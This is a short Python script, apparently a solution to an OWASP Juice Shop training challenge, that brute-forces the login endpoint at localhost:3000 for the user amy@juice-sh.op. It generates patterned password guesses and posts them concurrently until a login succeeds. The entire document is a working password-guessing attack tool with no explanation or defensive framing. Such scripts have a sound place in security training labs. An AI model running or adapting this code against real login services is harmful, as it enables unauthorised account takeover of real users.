__author__ = "@Georgesec"
import aiohttp
import asyncio

your_juice_shop_url = "http://localhost:3000/rest/user/login"
password_found = False  # Shared flag to stop once found

def build_queue():
    queue = []
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    numbers = "0123456789"

    for up in uppercase:
        for low in lowercase:
            for num in numbers:
                queue.append(f"{up}{num}{low}.....................")
    return queue

async def login_amy(async_queue):
    global password_found
    async with aiohttp.ClientSession() as session:
        while not async_queue.empty() and not password_found:
            pwd = await async_queue.get()
            print(f"Trying: {pwd}")
            async with session.post(your_juice_shop_url, json={
                'email': 'amy@juice-sh.op', 'password': pwd
            }) as resp:
                if 200 <= resp.status < 300:
                    password_found = True
                    print(f"\n✅ Password found: {pwd}\n")
                    return

async def main(password_queue):
    q = asyncio.Queue()
    for pwd in password_queue:
        await q.put(pwd)
    tasks = [asyncio.create_task(login_amy(q)) for _ in range(5)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    pw_queue = build_queue()
    asyncio.run(main(pw_queue))
